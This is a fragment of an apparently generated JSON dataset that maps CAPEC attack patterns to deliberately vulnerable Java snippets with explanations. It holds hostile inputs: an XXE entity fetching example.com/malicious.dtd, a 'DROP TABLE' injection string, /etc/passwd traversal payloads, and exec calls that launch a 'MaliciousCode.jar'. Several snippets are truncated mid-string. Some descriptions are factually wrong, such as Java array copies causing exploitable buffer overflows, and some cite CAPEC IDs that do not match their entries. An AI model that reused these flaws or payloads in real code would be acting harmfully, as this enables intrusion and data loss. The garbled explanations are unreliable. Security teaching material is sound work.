        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NamedNodeMap;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setNamespaceAware(true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            NodeList nodeList = doc.getChildNodes();\n            for (int i = 0; i < nodeList.getLength(); i++) {\n                Node node = nodeList.item(i);\n                if (node.getNodeType() == Node.ELEMENT_NODE) {\n                    NamedNodeMap attributes = node.getAttributes();\n                    for (int j = 0; j < attributes.getLength(); j++) {\n                        Node attribute = attributes.item(j);\n                        String attributeName = attribute.getNodeName();\n                        String attributeValue = attribute.getNodeValue();\n                        // Process the attribute value without validation\n                        System.out.println(\"Attribute \" + attributeName + \" has value \" + attributeValue);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        String maliciousXml = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"http://example.com/malicious.dtd\\\">]><foo>&xxe;</foo>\";\n        parseXML(maliciousXml);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML injection, missing XML validation, and improper restriction of XML external entity reference. The code does not properly neutralize special elements in the XML, allowing an attacker to modify the syntax, content, or commands of the XML. It also accepts XML from an untrusted source without validating it against a proper schema. Furthermore, it processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
    },
    {
        "capec_id": "100",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        byte[] userInput = new byte[1024];\n        readUserInput(userInput);\n        byte[] buffer = new byte[512];\n        System.arraycopy(userInput, 0, buffer, 0, userInput.length);\n    }\n\n    private static void readUserInput(byte[] userInput) {\n        // assume this method reads user input into userInput array\n    }\n}",
        "description": "This Java code snippet demonstrates a classic buffer overflow vulnerability (CWE-120). The userInput array is copied into the buffer array without checking the size of the userInput array, leading to a buffer overflow. This can cause the program to crash or allow an attacker to execute arbitrary code. The code also violates CWE-119 by not restricting operations within the bounds of the buffer. Additionally, CWE-131 is also applicable as the buffer size is not correctly calculated. CWE-129 is also relevant as the array index is not validated. CWE-805 is also demonstrated as the arraycopy method uses an incorrect length value. Finally, CWE-680 is also applicable as an integer overflow can occur when calculating the buffer size."
    },
    {
        "capec_id": "101",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SSIInjectionVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        String filePath = \"/var/www/html/\" + userInput + \".shtml\";\n        File file = new File(filePath);\n        if (file.exists()) {\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<!--#include virtual=\\\"\" + filePath + \"\\\"-->\";\n        } else {\n            response.sendError(404);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Include (SSI) injection vulnerability. The servlet takes user input and uses it to construct a file path, which is then used to include a file in the response. An attacker can manipulate the user input to inject malicious SSI directives, allowing them to execute arbitrary code or access sensitive files. This code embodies CWE-97 (Improper Neutralization of Server-Side Includes), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-433 (Unparsed Raw Web Content Delivery)."
    },
    {
        "capec_id": "102",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SessionSidejacking {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\\",
        "description": "This Java code snippet demonstrates a session sidejacking attack, which takes advantage of an unencrypted communication channel between a victim and a target system. The code sends a POST request to a login page with plaintext credentials, and then sniffs the response for a session token. Once the session token is captured, the code uses it to impersonate the victim and access a protected area of the target system. This code embodies CWE-294 (Authentication Bypass by Capture-replay), CWE-522 (Insufficiently Protected Credentials), CWE-523 (Unprotected Transport of Credentials), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)."
    },
    {
        "capec_id": "103",
        "code_snippet": "public class MaliciousFrame extends JFrame {\n    public MaliciousFrame() {\n        super(\"Trusted App\");\n        setLayout(new BorderLayout());\n        add(new JLabel(\"Please enter your credentials:\"), BorderLayout.NORTH);\n        JPanel panel = new JPanel();\n        panel.add(new JTextField());\n        panel.add(new JPasswordField());\n        add(panel, BorderLayout.CENTER);\n        add(new JButton(\"Submit\"), BorderLayout.SOUTH);\n        // CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        JFrame maliciousFrame = new JFrame(\"Trusted App\");\n        maliciousFrame.setLayout(new BorderLayout());\n        maliciousFrame.add(new JLabel(\"You are being redirected to a secure site...\"), BorderLayout.NORTH);\n        maliciousFrame.add(new JTextField(), BorderLayout.CENTER);\n        maliciousFrame.add(new JButton(\"Submit\"), BorderLayout.SOUTH);\n        maliciousFrame.setVisible(true);\n        // CWE-368: Context Switching Race Condition\n        while (true) {\n            try {\n                Thread.sleep(100);\n                maliciousFrame.toFront();\n            } catch (InterruptedException e) {\n                // CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n                maliciousFrame.dispatchEvent(new WindowEvent(maliciousFrame, WindowEvent.WINDOW_CLOSING));\n            }\n        }\n    }\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"<script>alert('You have been compromised');</script>\";\n        try {\n            // CWE-115: Misinterpretation of Input\n            Runtime.getRuntime().exec(\"rundll32 url.dll,FileProtocolHandler \" + maliciousCode);\n        } catch (IOException e) {\n            // Handle exception\n        }\n        new MaliciousFrame().setVisible(true);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of tricking a victim into unknowingly initiating an action in one system while interacting with the UI from a seemingly different system. The code creates a malicious JFrame that mimics a trusted application, and uses various CWEs to compromise the user's security."
    },
    {
        "capec_id": "104",
        "code_snippet": "public class ZoneBypassExample {\n    public static void main(String[] args) {\n        String userInput = \"<script>alert('XSS')</script>\";\n        String zone = \"http://trusted-zone.com\";\n        // CWE-20: Improper Input Validation\n        // No validation on userInput\n        String html = \"<html><body><iframe src='\" + userInput + \"'></iframe></body></html>\";\n        // CWE-116: Improper Encoding or Escaping of Output\n        // No encoding or escaping of userInput\n        // CWE-250: Execution with Unnecessary Privileges\n        // Running with elevated privileges\n        System.setSecurityManager(null);\n        // CWE-285: Improper Authorization\n        // No authorization check\n        if (zone.equals(\"http://trusted-zone.com\")) {\n            // CWE-638: Not Using Complete Mediation\n            // No access check on the resource\n            Runtime.getRuntime().exec(\"rundll32.exe, url.dll,FileProtocolHandler http://trusted-zone.com/unsignedActiveX\".split(\",\"));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a privilege elevation attack that bypasses security zone controls in a web browser. It lacks input validation, allowing an attacker to inject malicious scripts. The code runs with elevated privileges, performs no authorization checks, and does not properly encode or escape output. It also fails to perform access checks on resources, allowing an attacker to execute unsigned ActiveX controls or applets."
    },
    {
        "capec_id": "105",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.ServletException;\n\npublic class HTTPRequestSplitting extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String proxyRequest = \"GET /\" + userInput + \" HTTP/1.1\\r\\n\";\n        proxyRequest += \"Host: example.com\\r\\n\";\n        proxyRequest += \"\\r\\n\";\n        // Send the request to the backend server\n        sendRequest(proxyRequest);\n    }\n\n    private void sendRequest(String request) {\n        // Assume this method sends the request to the backend server\n    }\n}\n",
        "description": "This Java code snippet demonstrates HTTP Request Splitting (CAPEC-110) by constructing an HTTP request using user input without properly neutralizing special elements (CWE-74, CWE-113, CWE-138). The code uses the user input to create a new HTTP request, which can lead to HTTP Request Smuggling (CWE-444) and Interpretation Conflict (CWE-436) issues. The code does not validate or sanitize the user input, allowing an attacker to inject malicious HTTP requests."
    },
    {
        "capec_id": "106",
        "code_snippet": "public class LogInjectionExample {\n    public void logUserInput(String userInput) {\n        String logMessage = \"User input: \" + userInput;\n        System.out.println(logMessage);\n        // Write logMessage to a log file\n    }\n\n    public void generateWebPage(String userInput) {\n        String htmlPage = \"<img src='\" + userInput + \"'>\";\n        // Send htmlPage as a response to the user\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC-93 Log Injection-Tampering-Forging attack pattern. The logUserInput method logs user input without proper sanitization, allowing an attacker to inject malicious log entries. The generateWebPage method generates an HTML page with user input embedded in an IMG tag without proper neutralization, making it vulnerable to Cross-Site Scripting (XSS) attacks."
    },
    {
        "capec_id": "107",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class XSTVulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String xhr = request.getHeader(\"X-Requested-With\");\n        if (xhr == null) {\n            // Missing validation for X-Requested-With header\n            String cookie = request.getHeader(\"Cookie\");\n            response.getWriter().write(\"<html><body><h1>Stolen Cookie: \" + cookie + \"</h1></body></html>\");\n        }\n    }\n}\n",
        "description": "This Java servlet is vulnerable to Cross-Site Tracing (XST) due to the lack of validation for the X-Requested-With header, allowing an attacker to steal the victim's session cookie. The code also lacks proper input validation and neutralization, making it vulnerable to Cross-Site Scripting (XSS) and other attacks."
    },
    {
        "capec_id": "108",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"Robert'); DROP TABLE Users; --\";\n        String dbUrl = \"jdbc:sqlserver://localhost:1433;databaseName=mydb;user=myuser;password=mypassword\";\n        String query = \"SELECT * FROM Users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection conn = DriverManager.getConnection(dbUrl)) {\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            ResultSet resultSet = pstmt.executeQuery();\n\n            while (resultSet.next()) {\n                String username = resultSet.getString(\"username\");\n                String command = \"cmd /c echo \" + username + \" > C:\\\\output.txt\";\n                Runtime.getRuntime().exec(command);\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of SQL injection leading to OS command injection. The code constructs an SQL query using user input without proper validation, allowing an attacker to inject malicious SQL code. The code then executes a command using the Runtime.getRuntime().exec() method, which takes the output from the SQL query as an argument. This allows an attacker to inject OS commands, leading to OS command injection."
    },
    {
        "capec_id": "109",
        "code_snippet": "public class HibernateVulnerableDAO {\n    public List<User> getUsers(String username) {\n        Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n        session.beginTransaction();\n        Query query = session.createQuery(\\",
        "description": "This Java code snippet demonstrates a vulnerability to SQL injection using Hibernate, a popular Object Relational Mapping (ORM) tool. The getUsers method takes a username as input and constructs a dynamic SQL query using the input. The input is not properly validated or sanitized, allowing an attacker to inject malicious SQL commands. This is an example of CWE-20: Improper Input Validation, CWE-89: Improper Neutralization of Special Elements used in an SQL Command, CWE-564: SQL Injection: Hibernate, CWE-943: Improper Neutralization of Special Elements in Data Query Logic, and CWE-1083: Data Access from Outside Expected Data Manager Component."
    },
    {
        "capec_id": "110",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport javax.xml.soap.SOAPBody;\nimport javax.xml.soap.SOAPEnvelope;\nimport javax.xml.soap.SOAPException;\nimport javax.xml.soap.SOAPMessage;\n\npublic class SOAPService {\n    public static void processSOAPMessage(SOAPMessage message) throws SOAPException, SQLException {\n        SOAPBody soapBody = message.getSOAPBody();\n        String userId = soapBody.getElementsByTagName(\"userId\").item(0).getTextContent();\n        String password = soapBody.getElementsByTagName(\"password\").item(0).getTextContent();\n\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n        String query = \"SELECT * FROM users WHERE userId = '\" + userId + \"' AND password = '\" + password + \"'\";\n        PreparedStatement pstmt = conn.prepareStatement(query);\n        ResultSet result = pstmt.executeQuery();\n\n        while (result.next()) {\n            System.out.println(\"User authenticated successfully\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a SOAP service that is vulnerable to SQL injection. The service receives a SOAP message containing user credentials, constructs a dynamic SQL query using the input, and executes it without proper validation or parameter binding. This allows an attacker to inject malicious SQL code and potentially access sensitive data or modify the database."
    },
    {
        "capec_id": "111",
        "code_snippet": "public class VulnerableJSONServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String callback = req.getParameter(\"callback\");\n        String data = \"[{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"password123\\\"}]\";\n        resp.setContentType(\"application/json\");\n        resp.getWriter().write(callback + \"(\" + data + \")\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable JSON servlet that can be exploited using a JSON hijacking attack. The servlet takes a 'callback' parameter and wraps the sensitive data in a JSONP response, allowing an attacker to steal the data by making a cross-site request to the servlet and overriding the callback function. This code embodies CWE-345, CWE-346, CWE-352, CWE-79, and CWE-602 by failing to verify the authenticity of the callback function, not properly validating the source of the request, and relying on client-side security mechanisms."
    },
    {
        "capec_id": "112",
        "code_snippet": "public class BruteForceAttack {\n    private static final int MAX_ATTEMPTS = 1000000;\n    private static final String[] COMMON_PASSWORDS = {\"password123\", \"iloveyou\", \"dragonball\"};\n    private static final String ENCRYPTION_KEY = \"my_secret_key\";\n\n    public static void main(String[] args) {\n        String encryptedData = \"U2FsdGVkX1+...\";\n        String decryptedData = \"\";\n\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String password = generateWeakPassword(i);\n            decryptedData = decryptData(encryptedData, password);\n            if (decryptedData != null) {\n                System.out.println(\"Decrypted data: \" + decryptedData);\n                break;\n            }\n        }\n    }\n\n    private static String generateWeakPassword(int i) {\n        return \"password\" + i;\n    }\n\n    private static String decryptData(String encryptedData, String password) {\n        try {\n            // Using a weak encryption algorithm with a fixed key\n            return AES.decrypt(encryptedData, ENCRYPTION_KEY);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a brute force attack on a weakly encrypted data. The code uses a weak password generation mechanism, inadequate encryption strength, and allows excessive authentication attempts. The attacker tries to decrypt the data by iterating through a large number of weak passwords, which can be easily guessed or cracked. The code also uses a fixed encryption key, making it vulnerable to attacks."
    },
    {
        "capec_id": "113",
        "code_snippet": "public class SoCInterface {\n    private static final int REGISTER_ADDRESS = 0x12345678;\n    private static final int DEBUG_LOGIC_ACTIVATION_IOCTL = 0x90;\n    \n    public static void main(String[] args) {\n        // CWE-1192: No unique identifier for IP block\n        String ipBlockId = \\",
        "description": "This Java code snippet demonstrates the CAPEC of interface manipulation, where an adversary can manipulate the use or processing of an interface to bypass access control and execute unintended functionality. The code includes CWE-1192, CWE-1262, CWE-1299, CWE-782, and CWE-1313, which are related to improper identifier usage, insufficient access control, missing protection mechanisms, exposed IOCTLs, and hardware allowing activation of test or debug logic at runtime, respectively. The code shows how an attacker can directly access registers, shadow registers, and debug logic without proper access control, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "114",
        "code_snippet": "public class AuthenticationSystem {\n    private static final int MAX_ATTEMPTS = 3;\n    private int attempts = 0;\n    private boolean debugMode = true;\n    private String adminUsername = \"admin\";\n    private String adminPassword = \"password\";\n\n    public boolean authenticate(String username, String password) {\n        if (debugMode) {\n            // CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State\n            if (username.equals(adminUsername) && password.length() > 0) {\n                return true;\n            }\n        }\n        if (attempts < MAX_ATTEMPTS) {\n            // CWE-307: Improper Restriction of Excessive Authentication Attempts\n            attempts++;\n            if (username.equals(adminUsername) && password.equals(adminPassword)) {\n                return true;\n            }\n        }\n        // CWE-305: Authentication Bypass by Primary Weakness\n        if (username.length() > 0 && password.length() > 0) {\n            return true;\n        }\n        // CWE-287: Improper Authentication\n        if (username.equals(adminUsername)) {\n            return true;\n        }\n        // CWE-1390: Weak Authentication\n        if (username.length() > 0) {\n            return true;\n        }\n        return false;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the main idea of the CAPEC. It includes multiple weaknesses, such as improper authentication, weak authentication, and authentication bypass, making it susceptible to various attacks."
    },
    {
        "capec_id": "115",
        "code_snippet": "public class AuthenticationBypass {\n    private static boolean isAdmin = false;\n    private static String adminUsername = \"admin\";\n    private static String adminPassword = \"password\";\n\n    public static void main(String[] args) {\n        String username = \"attacker\";\n        String password = \"password\";\n\n        if (username.equals(adminUsername) && password.equals(adminPassword)) {\n            isAdmin = true;\n        }\n\n        // CWE-287: Improper Authentication\n        if (isAdmin) {\n            System.out.println(\"Access granted!\");\n            // Access protected data\n        } else {\n            System.out.println(\"Access denied!\");\n        }\n\n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        isAdmin = true;\n        System.out.println(\"Access granted! (Bypassed authentication)\");\n\n        // CWE-1390: Weak Authentication\n        if (username.length() > 0 && password.length() > 0) {\n            isAdmin = true;\n            System.out.println(\"Access granted! (Weak authentication)\");\n        }\n\n        // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n        if (args.length > 0 && args[0].equals(\"-bypass\")) {\n            isAdmin = true;\n            System.out.println(\"Access granted! (Alternate path)\");\n        }\n\n        // CWE-305: Authentication Bypass by Primary Weakness\n        if (username.equals(adminUsername) || password.equals(adminPassword)) {\n            isAdmin = true;\n            System.out.println(\"Access granted! (Primary weakness)\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of authentication bypass by evading or circumventing an authentication mechanism. It includes examples of CWE-287 (Improper Authentication), CWE-302 (Authentication Bypass by Assumed-Immutable Data), CWE-1390 (Weak Authentication), CWE-288 (Authentication Bypass Using an Alternate Path or Channel), and CWE-305 (Authentication Bypass by Primary Weakness). The code shows how an attacker can gain access to protected data without proper authentication."
    },
    {
        "capec_id": "116",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String debugMode = System.getProperty(\"debug\");\n        if (debugMode != null && debugMode.equals(\"true\")) {\n            File fuseFile = new File(\"/path/to/fuses\");\n            if (fuseFile.exists()) {\n                try {\n                    Properties props = new Properties();\n                    props.load(new java.io.FileInputStream(fuseFile));\n                    String sensitiveInfo = props.getProperty(\"security.sensitive.info\");\n                    System.out.println(sensitiveInfo);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        String searchPath = System.getProperty(\"java.library.path\");\n        String maliciousCodePath = \"/path/to/malicious/code\";\n        if (searchPath != null) {\n            searchPath += \":\" + maliciousCodePath;\n            System.setProperty(\"java.library.path\", searchPath);\n        }\n        try {\n            Runtime.getRuntime().exec(\"java -jar \" + maliciousCodePath + \"/MaliciousCode.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of actively probing the target to solicit sensitive information. It exposes sensitive information during debug mode (CWE-1243), uses an untrusted search path to load malicious code (CWE-426), and replicates malicious code (CWE-509). The code also creates an emergent resource by modifying the system properties (CWE-1229)."
    },
    {
        "capec_id": "117",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class SniffingAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"targetHost\", 80);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"username=password\";\n        out.writeBytes(sensitiveData);\n        out.flush();\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        byte[] receivedData = new byte[1024];\n        in.read(receivedData);\n        String receivedMessage = new String(receivedData);\n        System.out.println(\"Received message: \" + receivedMessage);\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        String malformedHttpRequest = \"GET / HTTP/1.1\\r\\nHost: targetHost\\r\\n\\r\\n\";\n        out.writeBytes(malformedHttpRequest);\n        out.flush();\n\n        // CWE-514: Covert Channel\n        String covertMessage = \"Hidden message\";\n        out.writeBytes(covertMessage);\n        out.flush();\n\n        // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        for (int i = 0; i < 1000; i++) {\n            out.writeBytes(\"Amplified message\" + i);\n            out.flush();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a sniffing attack, where an adversary monitors data streams to gather sensitive information. The code establishes a socket connection to a target host and transmits sensitive data in cleartext, violating CWE-319. It then receives data without verifying its integrity, violating CWE-924. The code also sends a malformed HTTP request, violating CWE-444, and transmits a covert message, violating CWE-514. Finally, it amplifies network traffic, violating CWE-406."
    },
    {
        "capec_id": "120",
        "code_snippet": "public class DoubleEncodingVulnerability {\n    public static void processRequest(String userInput) {\n        String encodedInput = userInput;\n        // CWE-173: Improper Handling of Alternate Encoding\n        encodedInput = java.net.URLEncoder.encode(encodedInput, \"UTF-8\");\n        encodedInput = java.net.URLEncoder.encode(encodedInput, \"UTF-8\"); // Double encoding\n        \n        // CWE-172: Encoding Error\n        String decodedInput = java.net.URLDecoder.decode(encodedInput, \"UTF-8\");\n        \n        // CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n        if (decodedInput.contains(\"..\")) {\n            // CWE-181: Incorrect Behavior Order: Validate Before Filter\n            // CWE-183: Permissive List of Allowed Inputs\n            // CWE-184: Incomplete List of Disallowed Inputs\n            // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n            // CWE-20: Improper Input Validation\n            // CWE-697: Incorrect Comparison\n            // CWE-692: Incomplete Denylist to Cross-Site Scripting\n            System.out.println(\"Access granted: \" + decodedInput);\n        } else {\n            System.out.println(\"Access denied\");\n        }\n    }\n    public static void main(String[] args) {\n        processRequest(\"%252E%252E%252Fetc%252Fpasswd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a double encoding vulnerability, where an input string is encoded twice using URL encoding, allowing an attacker to bypass filters and inject malicious input. The code also highlights various CWEs related to improper input validation, encoding, and filtering."
    },
    {
        "capec_id": "121",
        "code_snippet": "public class DebugInterface {\n    private static boolean DEBUG_MODE = true;\n    private static String SECURITY_TOKEN = \\",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting an unintentionally enabled debug interface on a production system. The code has debug mode enabled, which allows an adversary to access sensitive information and functionality. The debug interface reveals unnecessary system information, uses incorrect security tokens, and has incorrect chaining or granularity of debug components. This code embodies the CWEs of active debug code, failure to disable reserved bits, improper restriction of security token assignment, policy uses obsolete encoding, generation of incorrect security tokens, insecure security identifier mechanism, debug messages revealing unnecessary information, incorrect chaining or granularity of debug components, and missing source identifier in entity transactions on a System-On-Chip (SOC)."
    },
    {
        "capec_id": "122",
        "code_snippet": "public class InsecureAccessController {\n    private Map<String, Boolean> userPrivileges = new HashMap<>();\n\n    public InsecureAccessController() {\n        userPrivileges.put(\"admin\", true);\n        userPrivileges.put(\"user\", true);\n    }\n\n    public void performSensitiveOperation(String username) {\n        if (userPrivileges.getOrDefault(username, false)) {\n            // Sensitive operation that should only be accessible by admin\n            System.out.println(\"Performing sensitive operation...\");\n        }\n    }\n\n    public static void main(String[] args) {\n        InsecureAccessController controller = new InsecureAccessController();\n        controller.performSensitiveOperation(\"user\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting features reserved for privileged users. The InsecureAccessController class has a method performSensitiveOperation that should only be accessible by the admin user, but due to improper privilege management (CWE-269), the method can be accessed by any user, including non-privileged ones. The userPrivileges map does not properly restrict access, allowing any user to perform the sensitive operation. This is an example of incorrect permission assignment for a critical resource (CWE-732) and improper access control (CWE-284). The lack of isolation or compartmentalization (CWE-653) of the sensitive operation also contributes to the vulnerability."
    },
    {
        "capec_id": "123",
        "code_snippet": "public class VulnerableBufferExample {\n    public static void main(String[] args) {\n        byte[] buffer = new byte[10];\n        byte[] userInput = new byte[20];\n        System.arraycopy(userInput, 0, buffer, 0, userInput.length);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability. The `System.arraycopy` method is used to copy data from the `userInput` array to the `buffer` array, but the length of the `userInput` array is not checked, allowing an attacker to provide an array that is larger than the `buffer` array, resulting in a buffer overflow. This can lead to the reading or writing of unintended program memory, as described in the CAPEC. The related CWEs are CWE-119, CWE-126, and CWE-806."
    },
    {
        "capec_id": "124",
        "code_snippet": "public class SharedResourceVulnerability {\n    private static int sharedResource = 0;\n    \n    public static void main(String[] args) {\n        Thread thread1 = new Thread(new Runnable() {\n            public void run() {\n                for (int i = 0; i < 100000; i++) {\n                    sharedResource++;\n                }\n            }\n        });\n        \n        Thread thread2 = new Thread(new Runnable() {\n            public void run() {\n                for (int i = 0; i < 100000; i++) {\n                    sharedResource--;\n                }\n            }\n        });\n        \n        thread1.start();\n        thread2.start();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a shared resource between multiple threads. The CWEs related to this CAPEC include CWE-662 (Improper Synchronization), CWE-1189 (Improper Isolation of Shared Resources on System-on-a-Chip), CWE-1331 (Improper Isolation of Shared Resources in Network On Chip), CWE-1303 (Non-Transparent Sharing of Microarchitectural Resources), and CWE-1421 (Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution). In this example, two threads are accessing and modifying a shared resource (an integer variable) without proper synchronization, leading to a race condition and potential data corruption."
    },
    {
        "capec_id": "125",
        "code_snippet": "public class FloodServer {\n    public static void main(String[] args) {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new Handler(socket)).start();\n        }\n    }\n}\n\nclass Handler implements Runnable {\n    private Socket socket;\n    public Handler(Socket socket) {\n        this.socket = socket;\n    }\n    public void run() {\n        try {\n            while (true) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String message = reader.readLine();\n                if (message != null) {\n                    System.out.println(\\",
        "description": "This Java code snippet demonstrates a vulnerable server implementation that is susceptible to a flooding attack. The server accepts incoming connections and spawns a new thread to handle each connection. However, it does not impose any limits on the number of connections or the rate at which they are accepted, making it vulnerable to a flooding attack. An attacker can exploit this by rapidly establishing a large number of connections, exhausting the server's resources and preventing legitimate users from accessing the service. This code embodies CWE-404 (Improper Resource Shutdown or Release), CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-410 (Insufficient Resource Pool), CWE-400 (Uncontrolled Resource Consumption), and CWE-406 (Insufficient Control of Network Message Volume) weaknesses."
    },
    {
        "capec_id": "126",
        "code_snippet": "public class FileAccessor {\n    public static void accessFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            if (file.exists()) {\n                System.out.println(\"File found: \" + file.getAbsolutePath());\n                // Perform file operations\n            } else {\n                System.out.println(\"File not found\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error accessing file: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        accessFile(\"../../../../etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The `accessFile` method takes a file path as input and attempts to access the file. The `main` method calls `accessFile` with a malicious path that traverses out of the intended directory structure, potentially allowing an attacker to access sensitive files outside of the restricted directory."
    },
    {
        "capec_id": "127",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class DirectoryListingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String path = req.getParameter(\"path\");\n        File file = new File(path);\n        if (file.isDirectory()) {\n            String[] files = file.list();\n            resp.setContentType(\"text/plain\");\n            for (String f : files) {\n                resp.getWriter().println(f);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet is a vulnerable servlet that allows directory listing. It takes a 'path' parameter from the HTTP request and lists the contents of the directory at that path. The servlet does not perform any authorization checks, allowing an attacker to browse the directory tree and access sensitive files. This code embodies CWE-425 (Direct Request ('Forced Browsing')), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "128",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        int maxInt = Integer.MAX_VALUE;\n        int userInput = 1;\n        int result = maxInt + userInput;\n        if (result > 0) {\n            System.out.println(\"User input is valid\");\n            // Perform security-critical operations\n        } else {\n            System.out.println(\"User input is invalid\");\n        }\n    }\n}",
